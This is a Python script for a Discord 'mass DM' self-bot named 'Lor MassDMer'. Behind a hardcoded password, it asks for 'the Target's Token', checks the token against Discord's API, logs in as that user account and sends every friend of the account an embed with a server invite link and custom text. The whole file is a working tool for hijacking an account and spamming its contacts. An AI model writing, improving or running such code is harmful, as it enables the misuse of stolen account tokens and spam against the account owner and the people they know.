import discord
import os
import ctypes
import colorama
import requests
import sys,time,os
from colorama import Fore, Back, Style
from urllib import parse, request
from itertools import cycle

message = f"{Fore.RED}{Style.BRIGHT}Welcome To Lor MassDMer{Fore.RED}{Style.BRIGHT}"

def typewriter(message):
    for char in message:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.1) 

os.system("cls")

typewriter (message) 
def Clear():
    os.system('cls')
Clear()

def size():
  lol = 'mode 73,23'
  os.system(lol)
size()

while True:
    password = input("» Enter Password: ")
    if password =="LorBeamed":
        print("» Correct password")
        input("» Enter To Provide The Nuker To Show ")
        break
    else:
        print("In Correct password")
Clear()

while True:
    Text = input("Text » ")
    if Text =="TEXT_HERE":
        print("add a text kid")
        input("nub haha no text for u")
        exit(0)
    else:
        print("» Enter To Provide The Nuker To Show")
        break
Clear()

token = input("Provide The Target's Token »  ")


head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)

if src.status_code == 200:
    print('»Token Is Valid.')
    input("»Enter To Continue")
else:
    print(f'[{Fore.RED}-{Fore.RESET}] Wrong token tuff')
    input("Press any key")
    exit(0)
Clear()


print(f'''{Fore.MAGENTA}
                    {Fore.RED}╔╦═╗╔╦╗╦╔╗╔╔═╗  ╔═╗╦═╗╦╔═╗╔╗╔╔╦╗╦  ╦╔═╗╔╦╗{Fore.RED}
                   {Fore.RED}{Style.BRIGHT}  ║ ║║║║║║║║║ ╦  ╠╣ ╠╦╝║║╣ ║║║ ║║║  ║╚═╗ ║ {Fore.RED}{Style.BRIGHT}
                   {Fore.BLACK}{Style.BRIGHT} ═╩═╝╩ ╩╩╝╚╝╚═╝  ╚  ╩╚═╩╚═╝╝╚╝═╩╝╩═╝╩╚═╝ ╩ {Fore.BLACK}{Style.BRIGHT}
                                   {Fore.GREEN}{Style.BRIGHT}L{Fore.GREEN}{Style.BRIGHT}{Fore.BLACK}{Style.BRIGHT}o{Fore.BLACK}{Style.BRIGHT}{Fore.GREEN}{Style.BRIGHT}r{Fore.GREEN}{Style.BRIGHT}
{Fore.BLACK}{Style.BRIGHT}═════════════════════════════════════════════════════════════════════════{Fore.BLACK}{Style.BRIGHT}
     ''')

client = discord.Client()


@client.event
async def on_connect():
  for user in client.user.friends:
    try:
      Lor = discord.Embed(color= discord.Color(0xff0000))
      Lor.set_author(name="This is a Mass DM")
      Lor.add_field(name=f"https://discord.gg/Kw5hM9K7g9",value=Text)
      Lor.set_image(url="https://tenor.com/view/david-monke-david-gaming-gaming-monke-gaming-gif-19468007")
      await user.send(embed=Lor)
      print(f"{Fore.BLACK}{Style.BRIGHT}messaged:{Fore.BLACK}{Style.BRIGHT} {Fore.RED}{Style.BRIGHT}{user.name}")
    except:
       print(f"couldnt message: {user.name}")
       print(f"Directed messaged all users friends")


client.run(token, bot=False)
